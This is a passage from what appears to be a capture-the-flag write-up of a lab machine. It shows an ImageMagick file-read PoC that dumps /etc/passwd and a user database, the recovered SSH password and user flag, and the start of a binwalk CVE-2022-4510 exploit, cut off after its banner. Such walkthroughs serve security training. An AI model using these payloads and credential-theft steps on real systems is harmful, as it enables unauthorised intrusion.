  Elapsed Time: 0m:0.001059s
  Pixels Per Second: 14.8Mi
```
   
The Last Step of `PoC` is It use python to `decode` the value within of  `Raw profile type`:
```sh
┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ nano passwd.py

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ cat  passwd.py
print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a").decode("utf-8"))

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ python3 passwd.py
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ python3 passwd.py | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
```
   
   
I see the `login` and `Register` page, and I discover a interesting directory:
```sh
┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ cat  login.php  | grep db      
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");

┌──(kali㉿kali)-[~/git-dumper/Pilgrimage]
└─$ cat  register.php  | grep db
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("INSERT INTO `users` (username,password) VALUES (?,?)");
```    
   
Thereby I do the same process of before, but I create the `payload` in this way:
```sh
┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ cp /home/kali/lupin.png  .                                    

┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ python3 generate.py -f "/var/db/pilgrimage" -o lupin.png   

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > lupin.png

```

Now I read the  value within of  `Raw profile type`:
```sh
┌──(kali㉿kali)-[~/imagemagick-lfi-poc]
└─$ identify -verbose 64f8986db8724.png                                     
Image: 64f8986db8724.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                 65278.00 (0.9961)
      Mean:                    11062.54 (0.1688)
      Standard Deviation:      15530.77 (0.2370)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.5Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 128x128+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type: 

   20480
53514c69746520666f726d61742033001000010100402020000000790000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000079002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
...
```

The output It's very big, thereby I use this site `https://cyberchef.org/#recipe=From_Hex('Auto')` to decode it:
```sh
...
emilyabigchonkyboi123
...
```

Credentials:
```
- Username: emily
- Password: abigchonkyboi123
```

I login to ssh like emily and I find the `user flag`:
```
┌──(kali㉿kali)-[~]
└─$ ssh emily@pilgrimage.htb
The authenticity of host 'pilgrimage.htb (10.10.11.219)' can't be established.
ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pilgrimage.htb' (ED25519) to the list of known hosts.
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep  6 23:01:07 2023 from 10.10.14.48
emily@pilgrimage:~$ ls -all
total 880
drwxr-xr-x 6 emily emily   4096 Sep  6 23:52 .
drwxr-xr-x 3 root  root    4096 Jun  8 00:10 ..
lrwxrwxrwx 1 emily emily      9 Feb 10  2023 .bash_history -> /dev/null
-rw-r--r-- 1 emily emily    220 Feb 10  2023 .bash_logout
-rw-r--r-- 1 emily emily   3526 Feb 10  2023 .bashrc
-rw-r--r-- 1 emily emily   1678 Sep  6 20:38 binwalk_exploit.png
drwxr-xr-x 3 emily emily   4096 Jun  8 00:10 .config
-rw-r--r-- 1 emily emily     44 Jun  1 19:15 .gitconfig
drwx------ 3 emily emily   4096 Sep  6 23:09 .gnupg
-rwxr-xr-x 1 emily emily 848400 Sep  3 14:30 linpeas.sh
drwxr-xr-x 3 emily emily   4096 Jun  8 00:10 .local
-rw-r--r-- 1 emily emily    807 Feb 10  2023 .profile
drwxr-xr-x 3 emily emily   4096 Sep  7 00:17 r
-rw-r----- 1 root  emily     33 Sep  6 15:42 user.txt
emily@pilgrimage:~$ cat user.txt
61b69e13978210e5a1f080bbea007749
```


## Privilege Escalation

I see the `processes`:
```sh
emily@pilgrimage:/var/lib/sudo/lectured$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.2  98260 10008 ?        Ss   01:35   0:01 /sbin/init
root           2  0.0  0.0      0     0 ?        S    01:35   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   01:35   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   01:35   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   01:35   0:00 [kworker/0:0H-events_highpri]
root           8  0.0  0.0      0     0 ?        I<   01:35   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    01:35   0:00 [rcu_tasks_rude_]
root          10  0.0  0.0      0     0 ?        S    01:35   0:00 [rcu_tasks_trace]
root          11  0.0  0.0      0     0 ?        S    01:35   0:00 [ksoftirqd/0]
root          12  0.0  0.0      0     0 ?        I    01:35   0:00 [rcu_sched]
root          13  0.0  0.0      0     0 ?        S    01:35   0:00 [migration/0]
root          14  0.0  0.0      0     0 ?        I    01:35   0:00 [kworker/0:1-events]
root          15  0.0  0.0      0     0 ?        S    01:35   0:00 [cpuhp/0]
root          16  0.0  0.0      0     0 ?        S    01:35   0:00 [cpuhp/1]
root          17  0.0  0.0      0     0 ?        S    01:35   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    01:35   0:00 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I<   01:35   0:00 [kworker/1:0H-events_highpri]
root          23  0.0  0.0      0     0 ?        S    01:35   0:00 [kdevtmpfs]
root          24  0.0  0.0      0     0 ?        I<   01:35   0:00 [netns]
root          25  0.0  0.0      0     0 ?        S    01:35   0:00 [kauditd]
root          27  0.0  0.0      0     0 ?        S    01:35   0:00 [khungtaskd]
root          28  0.0  0.0      0     0 ?        S    01:35   0:00 [oom_reaper]
root          29  0.0  0.0      0     0 ?        I<   01:35   0:00 [writeback]
root          30  0.0  0.0      0     0 ?        S    01:35   0:00 [kcompactd0]
root          31  0.0  0.0      0     0 ?        SN   01:35   0:00 [ksmd]
root          32  0.0  0.0      0     0 ?        SN   01:35   0:00 [khugepaged]
root          50  0.0  0.0      0     0 ?        I<   01:35   0:00 [kintegrityd]
root          51  0.0  0.0      0     0 ?        I<   01:35   0:00 [kblockd]
root          52  0.0  0.0      0     0 ?        I<   01:35   0:00 [blkcg_punt_bio]
root          53  0.0  0.0      0     0 ?        I<   01:35   0:00 [edac-poller]
root          54  0.0  0.0      0     0 ?        I<   01:35   0:00 [devfreq_wq]
root          56  0.0  0.0      0     0 ?        I<   01:35   0:00 [kworker/0:1H-kblockd]
root          57  0.0  0.0      0     0 ?        S    01:35   0:00 [kswapd0]
root          58  0.0  0.0      0     0 ?        I<   01:35   0:00 [kthrotld]
root          59  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/24-pciehp]
root          60  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/25-pciehp]
root          61  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/26-pciehp]
root          62  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/27-pciehp]
root          63  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/28-pciehp]
root          64  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/29-pciehp]
root          65  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/30-pciehp]
root          66  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/31-pciehp]
root          67  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/32-pciehp]
root          68  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/33-pciehp]
root          69  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/34-pciehp]
root          70  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/35-pciehp]
root          71  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/36-pciehp]
root          72  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/37-pciehp]
root          73  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/38-pciehp]
root          74  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/39-pciehp]
root          75  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/40-pciehp]
root          76  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/41-pciehp]
root          77  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/42-pciehp]
root          78  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/43-pciehp]
root          79  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/44-pciehp]
root          80  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/45-pciehp]
root          81  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/46-pciehp]
root          82  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/47-pciehp]
root          83  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/48-pciehp]
root          84  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/49-pciehp]
root          85  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/50-pciehp]
root          86  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/51-pciehp]
root          87  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/52-pciehp]
root          88  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/53-pciehp]
root          89  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/54-pciehp]
root          90  0.0  0.0      0     0 ?        S    01:35   0:00 [irq/55-pciehp]
root          91  0.0  0.0      0     0 ?        I<   01:35   0:00 [acpi_thermal_pm]
root          92  0.0  0.0      0     0 ?        I<   01:35   0:00 [ipv6_addrconf]
root         101  0.0  0.0      0     0 ?        I<   01:35   0:00 [kstrp]
root         104  0.0  0.0      0     0 ?        I<   01:35   0:00 [zswap-shrink]
root         105  0.0  0.0      0     0 ?        I<   01:35   0:00 [kworker/u257:0]
root         127  0.0  0.0      0     0 ?        I<   01:35   0:00 [kworker/1:1H-kblockd]
root         151  0.0  0.0      0     0 ?        I<   01:35   0:00 [ata_sff]
root         152  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_0]
root         153  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_0]
root         154  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_1]
root         155  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_2]
root         156  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_1]
root         157  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_2]
root         158  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_3]
root         160  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_3]
root         161  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_4]
root         162  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_4]
root         163  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_5]
root         164  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_5]
root         165  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_6]
root         166  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_6]
root         167  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_7]
root         168  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_7]
root         169  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_8]
root         170  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_8]
root         171  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_9]
root         172  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_9]
root         173  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_10]
root         174  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_10]
root         175  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_11]
root         176  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_11]
root         177  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_12]
root         178  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_12]
root         179  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_13]
root         180  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_13]
root         181  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_14]
root         182  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_14]
root         183  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_15]
root         184  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_15]
root         185  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_16]
root         186  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_16]
root         187  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_17]
root         188  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_17]
root         189  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_18]
root         190  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_18]
root         191  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_19]
root         192  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_19]
root         193  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_20]
root         194  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_20]
root         195  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_21]
root         196  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_21]
root         197  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_22]
root         198  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_22]
root         199  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_23]
root         200  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_23]
root         201  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_24]
root         202  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_24]
root         203  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_25]
root         204  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_25]
root         205  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_26]
root         206  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_26]
root         207  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_27]
root         208  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_27]
root         209  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_28]
root         210  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_28]
root         211  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_29]
root         212  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_29]
root         213  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_30]
root         214  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_30]
root         215  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_31]
root         216  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_31]
root         242  0.0  0.0      0     0 ?        I    01:35   0:00 [kworker/u256:28-events_unbound]
root         243  0.0  0.0      0     0 ?        I    01:35   0:00 [kworker/u256:29-events_unbound]
root         244  0.0  0.0      0     0 ?        I    01:35   0:00 [kworker/u256:30-flush-8:0]
root         249  0.0  0.0      0     0 ?        I<   01:35   0:00 [mpt_poll_0]
root         251  0.0  0.0      0     0 ?        I<   01:35   0:00 [mpt/0]
root         252  0.0  0.0      0     0 ?        S    01:35   0:00 [scsi_eh_32]
root         253  0.0  0.0      0     0 ?        I<   01:35   0:00 [scsi_tmf_32]
root         254  0.0  0.0      0     0 ?        I    01:35   0:00 [kworker/0:3-cgroup_destroy]
root         468  0.0  0.0      0     0 ?        S    01:36   0:00 [jbd2/sda1-8]
root         469  0.0  0.0      0     0 ?        I<   01:36   0:00 [ext4-rsv-conver]
root         503  0.0  0.2  64800 11720 ?        Ss   01:36   0:00 /lib/systemd/systemd-journald
root         516  0.1  0.0      0     0 ?        I    01:36   0:00 [kworker/1:3-events]
root         525  0.0  0.1  21716  5536 ?        Ss   01:36   0:00 /lib/systemd/systemd-udevd
systemd+     563  0.0  0.1  88436  6056 ?        Ssl  01:36   0:00 /lib/systemd/systemd-timesyncd
root         569  0.0  0.2  47748 10780 ?        Ss   01:36   0:00 /usr/bin/VGAuthService
root         570  0.2  0.1 162996  7272 ?        Ssl  01:36   0:01 /usr/bin/vmtoolsd
root         574  0.0  0.0  87060  2056 ?        S<sl 01:36   0:00 /sbin/auditd
_laurel      582  0.0  0.1   9772  5660 ?        S<   01:36   0:00 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         586  0.0  0.0      0     0 ?        S    01:36   0:00 [irq/16-vmwgfx]
root         587  0.0  0.0      0     0 ?        I<   01:36   0:00 [ttm_swap]
root         590  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc0]
root         592  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc1]
root         604  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc2]
root         610  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc3]
root         613  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc4]
root         614  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc5]
root         615  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc6]
root         616  0.0  0.0      0     0 ?        S    01:36   0:00 [card0-crtc7]
root         629  0.0  0.1  99884  7672 ?        Ssl  01:36   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         652  0.0  0.0      0     0 ?        I<   01:36   0:00 [cryptd]
root         682  0.0  0.0   6744  2748 ?        Ss   01:36   0:00 /usr/sbin/cron -f
message+     683  0.0  0.1   8260  4072 ?        Ss   01:36   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         686  0.0  0.0   6816  3048 ?        Ss   01:36   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         689  0.0  0.6 209752 27128 ?        Ss   01:36   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         690  0.0  0.1 220796  4940 ?        Ssl  01:36   0:00 /usr/sbin/rsyslogd -n -iNONE
root         696  0.0  0.1  13848  7236 ?        Ss   01:36   0:00 /lib/systemd/systemd-logind
root         720  0.0  0.0   5844  1784 tty1     Ss+  01:36   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         736  0.0  0.0   2516   708 ?        S    01:36   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         737  0.0  0.0   6816   252 ?        S    01:36   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         753  0.0  0.1  13352  7236 ?        Ss   01:36   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         818  0.0  0.0      0     0 ?        I    01:36   0:00 [kworker/1:4-cgroup_destroy]
root         827  0.0  0.0  56376  1628 ?        Ss   01:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data     829  0.0  0.1  56944  5316 ?        S    01:36   0:00 nginx: worker process
www-data     830  0.0  0.1  56944  5316 ?        S    01:36   0:00 nginx: worker process
root         831  0.0  0.0      0     0 ?        I<   01:36   0:00 [nfit]
www-data     862  0.0  0.2 209988 11204 ?        S    01:36   0:00 php-fpm: pool www
www-data     863  0.0  0.2 209988 11204 ?        S    01:36   0:00 php-fpm: pool www
root         976  0.0  0.2  14508  8676 ?        Ss   01:42   0:00 sshd: emily [priv]
emily        979  0.0  0.1  15164  7840 ?        Ss   01:42   0:00 /lib/systemd/systemd --user
emily        980  0.0  0.0 101216  2524 ?        S    01:42   0:00 (sd-pam)
root         987  0.0  0.0      0     0 ?        I    01:42   0:00 [kworker/1:0-events]
emily        998  0.0  0.1  14720  6008 ?        S    01:42   0:00 sshd: emily@pts/0
emily        999  0.0  0.1   8164  4956 pts/0    Ss   01:43   0:00 -bash
root        1002  0.0  0.0      0     0 ?        I    01:43   0:00 [kworker/u256:0-ext4-rsv-conversion]
emily       1035  0.0  0.0   9756  3316 pts/0    R+   01:48   0:00 ps aux
```

I read this file `/bin/bash /usr/sbin/malwarescan.sh`:
```sh
emily@pilgrimage:/var/lib/sudo/lectured$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

This Bash script monitors a specific directory (/var/www/pilgrimage.htb/shrunk/) using inotifywait, a command that waits for file system events. When a new file is created in the monitored directory, the full path to the file is read from the FILE variable.

Next, the path to the file is extracted using tail and sed, and then the binwalk command is used to parse the file. The result of the analysis (binout) is then compared with a list of keywords within the blacklist array.

If one of the blacklisted keywords is found in the scan result (binout), the file is deleted using /usr/bin/rm.

In summary, this script constantly monitors a directory for new files created and tries to parse each new file with binwalk. If one of the blacklisted keywords is found in the analysis, the file is deleted.

Now I search the  `version` of `Binwalk`:
```sh
emily@pilgrimage:/$ /usr/local/bin/binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
```

I find this exploit `https://www.exploit-db.com/exploits/51249`, I copy the exploit in the Local Machine:
```sh
┌──(kali㉿kali)-[~]
└─$ nano priv.py                

┌──(kali㉿kali)-[~]
└─$ chmod +x priv.py  

┌──(kali㉿kali)-[~]
└─$ cat priv.py           
# Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)
# Exploit Author: Etienne Lacoche
# CVE-ID: CVE-2022-4510
import os
import inspect
import argparse

print("")
print("################################################")
print("------------------CVE-2022-4510----------------")
print("################################################")
print("--------Binwalk Remote Command Execution--------")
print("------Binwalk 2.1.2b through 2.3.2 included-----")
print("------------------------------------------------")
print("################################################")
print("----------Exploit by: Etienne Lacoche-----------")
print("---------Contact Twitter: @electr0sm0g----------")
print("------------------Discovered by:----------------")
